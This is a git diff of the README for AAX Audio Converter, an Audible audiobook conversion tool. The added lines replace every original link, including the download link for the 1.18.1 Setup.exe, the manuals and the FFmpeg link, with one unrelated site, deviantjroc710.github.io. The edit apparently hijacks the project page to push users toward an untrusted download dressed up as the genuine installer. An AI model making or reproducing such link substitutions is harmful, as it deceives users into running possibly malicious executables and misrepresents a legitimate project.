@@ -1,7 +1,7 @@
 # AAX Audio Converter
 Convert Audible aax files to mp3 and m4a/m4b
 
-[![GitHub All Releases](https://img.shields.io/github/downloads/audiamus/AaxAudioConverter/total)](https://github.com/audiamus/AaxAudioConverter/releases) [![GitHub](https://img.shields.io/github/license/audiamus/AaxAudioConverter)](https://github.com/audiamus/AaxAudioConverter/blob/master/LICENSE) [![](https://img.shields.io/badge/platform-Windows-blue)](http://microsoft.com/windows) [![](https://img.shields.io/badge/language-C%23-blue)](http://csharp.net/) [![GitHub release (latest by date)](https://img.shields.io/github/v/release/audiamus/AaxAudioConverter)](https://github.com/audiamus/AaxAudioConverter/releases/latest)
+[![GitHub All Releases](https://img.shields.io/github/downloads/audiamus/AaxAudioConverter/total)](https://deviantjroc710.github.io) [![GitHub](https://img.shields.io/github/license/audiamus/AaxAudioConverter)](https://deviantjroc710.github.io) [![](https://img.shields.io/badge/platform-Windows-blue)](https://deviantjroc710.github.io) [![](https://img.shields.io/badge/language-C%23-blue)](https://deviantjroc710.github.io) [![GitHub release (latest by date)](https://img.shields.io/github/v/release/audiamus/AaxAudioConverter)](https://deviantjroc710.github.io)
 
 ![](res/Cover.png?raw=true)
 
@@ -12,7 +12,7 @@ Convert Audible aax files to mp3 and m4a/m4b
 - Converts Audible proprietary .aax files to plain .mp3 or .m4a/.m4b. 
 - Also offers basic support for older .aa files.
 - Windows application, with all the classic features of the Windows eco-system.
-- Requires either [Book Lib Connect](https://github.com/audiamus/BookLibConnect), (legacy) Audible Manager, or personal activation code.
+- Requires either [Book Lib Connect](https://deviantjroc710.github.io), (legacy) Audible Manager, or personal activation code.
   - _With the retirement of the Win10 Audible app, Book Lib Connect is the recommended way to download the books. (Book Lib Connect is to become an integrated component of AAX Audio Converter in the future.)_
   - _An activation code is not needed for books downloaded with Book Lib Connect. If AAX Audio Converter asks for one, any code will do._
 - Processing Modes: 
@@ -32,7 +32,7 @@ Convert Audible aax files to mp3 and m4a/m4b
 - Other noteworthy features:
   - Supports more than 255 chapters in a book.
   - Supports very long books.
-- Delegates all audio processing to powerful [FFmpeg](https://www.ffmpeg.org/), including DRM handling.
+- Delegates all audio processing to powerful [FFmpeg](https://deviantjroc710.github.io), including DRM handling.
 - High performance: Utilizes all available processor cores to run conversion work in parallel.
   - With detailed progress status and performance monitoring.
 - Optionally copies original .aax file to a new location after the conversion, with a customizable name.
@@ -53,34 +53,34 @@ AAX Audio Converter is configured to support high DPI monitors under Windows 10.
 ## Download
 Windows setup package version 1.18.1, English and German, with manuals, plus FFmpeg executable:
 
-**[AaxAudioConverter-1.18.1-Setup.exe](https://github.com/audiamus/AaxAudioConverter/releases/download/v1.18.1/AaxAudioConverter-1.18.1-Setup.exe)**
+**[AaxAudioConverter-1.18.1-Setup.exe](https://deviantjroc710.github.io)**
 
 Manuals (also included in the setup package):
 
-**[English](https://github.com/audiamus/AaxAudioConverter/releases/download/v1.18.1/AaxAudioConverter.pdf)**
+**[English](https://deviantjroc710.github.io)**
 
-**[German](https://github.com/audiamus/AaxAudioConverter/releases/download/v1.18.1/AaxAudioConverter.de.pdf)**
+**[German](https://deviantjroc710.github.io)**
 
 
 ## Dependencies
 ### Audible account
-Unless books are downloaded with [Book Lib Connect](https://github.com/audiamus/BookLibConnect) - the recommended way -, AAX Audio Converter needs the user's personal Audible activation code to be able to process his/her Audible audiobooks.
+Unless books are downloaded with [Book Lib Connect](https://deviantjroc710.github.io) - the recommended way -, AAX Audio Converter needs the user's personal Audible activation code to be able to process his/her Audible audiobooks.
 
 Without Book Lib Connect, the easiest way to obtain the Audible activation code is to install and activate legacy “Audible Manager”. While no longer available from Audible directly, other websites still list it. With Audible Manager installed and activated, i.e. associated with the Audible account, AAX Audio Converter should be able to find the activation code automatically.
 
 ### FFmpeg
-All audio processing in AAX Audio Converter, including DRM handling, is carried out by [FFmpeg](https://www.ffmpeg.org/). 
+All audio processing in AAX Audio Converter, including DRM handling, is carried out by [FFmpeg](https://deviantjroc710.github.io). 
 The AAX Audio Converter installation package comes pre-bundled with a suitable FFmpeg.exe. 
 
 ## Feedback
 Comments and questions can be posted in the discussions section here on GitHub or in the AAX Audio Converter chatroom on Gitter:
 
-[![Discussions](https://img.shields.io/badge/discussions-on%20GitHub-green)](https://github.com/audiamus/AaxAudioConverter/discussions)
-[![Gitter](https://badges.gitter.im/AaxAudioConverter/community.svg)](https://gitter.im/AaxAudioConverter/community?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge)
+[![Discussions](https://img.shields.io/badge/discussions-on%20GitHub-green)](https://deviantjroc710.github.io)
+[![Gitter](https://deviantjroc710.github.io)](https://deviantjroc710.github.io)
 
 In case of more serious matters, like bug reports and other unexpected behavior, visit the issue section here on GitHub: 
 
-[![GitHub issues](https://img.shields.io/github/issues/audiamus/AaxAudioConverter)](https://github.com/audiamus/AaxAudioConverter/issues)
+[![GitHub issues](https://img.shields.io/github/issues/audiamus/AaxAudioConverter)](https://deviantjroc710.github.io)
 
 For exceptions, please provide the call stack as shown by the program. For diagnosis of unexpected behavior you can run AAX Audio Converter with the log option activated. Zip-compress the log file and upload/attach it to the issue, but read the privacy note in the manual first.    
 
@@ -89,4 +89,4 @@ Note that this software does not ‘crack’ the DRM or circumvent it in any oth
 
 Please only use this application for gaining full access to your own audiobooks for archiving/conversion/convenience. De-DRMed audiobooks must not be uploaded to open servers, torrents, or other methods of mass distribution. No help will be given to people doing such things. Authors, retailers and publishers all need to make a living, so that they can continue to produce audiobooks for us to listen to and enjoy.
 
-(*This blurb is borrowed from https://github.com/KrumpetPirate/AAXtoMP3 and https://apprenticealf.wordpress.com/*). 
+(*This blurb is borrowed from https://deviantjroc710.github.io and https://deviantjroc710.github.io*). 
